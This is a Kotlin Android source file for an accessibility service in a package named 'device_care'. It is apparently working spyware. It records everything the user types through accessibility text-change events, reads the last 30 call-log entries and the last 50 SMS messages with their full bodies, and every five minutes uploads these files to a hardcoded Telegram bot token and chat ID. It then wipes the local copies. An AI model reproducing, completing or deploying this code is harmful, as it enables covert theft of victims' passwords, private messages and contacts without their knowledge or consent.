package com.shaonx.device_care

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.view.accessibility.AccessibilityEvent
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private val logInterval = 300000L // 5 min

    companion object {
        var instance: MyAccessibilityService? = null
        var flutterCallback: ((String) -> Unit)? = null

        // Shared limits used by both MyAccessibilityService and MainActivity
        const val CALL_LOG_LIMIT = 30
        const val SMS_LOG_LIMIT = 50
    }

    override fun onServiceConnected() {
        instance = this
        startPeriodicTask()
    }

    private fun startPeriodicTask() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                // Send keystroke logs to Telegram
                sendLogFileToTelegram()
                // Fetch new call/SMS entries and send them to Telegram
                fetchAndSendCommLogs()
                handler.postDelayed(this, logInterval)
            }
        }, logInterval)
    }

    // --- KEYSTROKE LOG FILE SENDING (existing functionality) ---

    private fun sendLogFileToTelegram() {
        val logFile = File(filesDir, "keypress_logs.txt")
        if (logFile.exists() && logFile.length() > 0) {
            // delegate to the generic sender on a background thread
            thread { sendFileToTelegram(logFile) }
        }
    }

    // --- CALL LOG & SMS FETCHING AND SENDING ---

    /**
     * Fetches the last 30 call log entries and last 50 SMS messages,
     * writes them to comm_logs.txt, and sends the file to Telegram.
     */
    private fun fetchAndSendCommLogs() {
        thread {
            try {
                val commLogFile = File(filesDir, "comm_logs.txt")
                val sb = StringBuilder()
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

                // --- Fetch last 30 call log entries (newest first) ---
                try {
                    val callCursor: Cursor? = contentResolver.query(
                        CallLog.Calls.CONTENT_URI,
                        arrayOf(
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DATE,
                            CallLog.Calls.DURATION
                        ),
                        null,
                        null,
                        "${CallLog.Calls.DATE} DESC"  // newest first
                    )

                    callCursor?.use { cursor ->
                        var count = 0
                        if (cursor.count > 0) {
                            sb.appendLine("===== LAST $CALL_LOG_LIMIT CALLS =====")
                        }
                        while (cursor.moveToNext() && count < CALL_LOG_LIMIT) {
                            val number = cursor.getString(0) ?: "Unknown"
                            val name = cursor.getString(1) ?: ""
                            val type = cursor.getInt(2)
                            val date = cursor.getLong(3)
                            val duration = cursor.getInt(4)

                            val callType = when (type) {
                                CallLog.Calls.INCOMING_TYPE -> "Incoming"
                                CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                                CallLog.Calls.MISSED_TYPE -> "Missed"
                                CallLog.Calls.REJECTED_TYPE -> "Rejected"
                                else -> "Unknown"
                            }

                            val displayName = if (name.isNotEmpty()) "$name ($number)" else number
                            val timeStr = dateFormat.format(Date(date))

                            sb.appendLine("[$timeStr] $callType: $displayName | Duration: ${duration}s")
                            count++
                        }
                    }
                } catch (e: SecurityException) {
                    sb.appendLine("[CALL LOG] Permission not granted")
                }

                // --- Fetch last 50 SMS entries (newest first) ---
                try {
                    val smsCursor: Cursor? = contentResolver.query(
                        Telephony.Sms.CONTENT_URI,
                        arrayOf(
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.TYPE,
                            Telephony.Sms.DATE
                        ),
                        null,
                        null,
                        "${Telephony.Sms.DATE} DESC"  // newest first
                    )

                    smsCursor?.use { cursor ->
                        var count = 0
                        if (cursor.count > 0) {
                            sb.appendLine("===== LAST $SMS_LOG_LIMIT MESSAGES =====")
                        }
                        while (cursor.moveToNext() && count < SMS_LOG_LIMIT) {
                            val address = cursor.getString(0) ?: "Unknown"
                            val body = cursor.getString(1) ?: ""
                            val type = cursor.getInt(2)
                            val date = cursor.getLong(3)

                            val smsType = when (type) {
                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
                                Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                                Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
                                else -> "Other"
                            }

                            val timeStr = dateFormat.format(Date(date))

                            sb.appendLine("[$timeStr] $smsType from $address: $body")
                            count++
                        }
                    }
                } catch (e: SecurityException) {
                    sb.appendLine("[SMS LOG] Permission not granted")
                }

                // Send only if there's data
                val content = sb.toString()
                if (content.isNotBlank()) {
                    commLogFile.writeText(content)
                    sendFileToTelegram(commLogFile)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    /**
     * Generic file sender to Telegram — reusable for any log file.
     */
    private fun sendFileToTelegram(file: File) {
        val token = "8279084594:AAG6F4IX2Ahz1tc32cKaH3dkXNOubRSGLpg"
        val chatId = "8231933199"

        if (!file.exists() || file.length() == 0L) return

        try {
            val boundary = "Boundary-${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot$token/sendDocument")
            val conn = url.openConnection() as HttpURLConnection

            conn.doOutput = true
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val outputStream = DataOutputStream(conn.outputStream)

            outputStream.writeBytes("--$boundary\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            outputStream.writeBytes("$chatId\r\n")

            outputStream.writeBytes("--$boundary\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\n")
            outputStream.writeBytes("Content-Type: text/plain\r\n\r\n")

            val fileInputStream = FileInputStream(file)
            val buffer = ByteArray(4096)
            var bytesRead: Int
            while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            fileInputStream.close()

            outputStream.writeBytes("\r\n--$boundary--\r\n")
            outputStream.flush()
            outputStream.close()

            if (conn.responseCode == 200) {
                // Clear the file after successful send
                file.writeText("")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // --- KEYSTROKE CAPTURE (existing functionality) ---

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // event.text is a List<CharSequence> — joinToString() avoids the
            // unwanted "[text]" square brackets that .toString() would produce
            val typedText = event.text.joinToString(separator = " ")
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val entry = "[$timestamp] $typedText\n"

            // Always write to disk — works even when Flutter is dead
            try {
                FileWriter(File(filesDir, "keypress_logs.txt"), true).use { it.write(entry) }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // Push to Flutter UI only if it's alive
            flutterCallback?.invoke(typedText)
        }
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        flutterCallback = null
        handler.removeCallbacksAndMessages(null)
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {}
}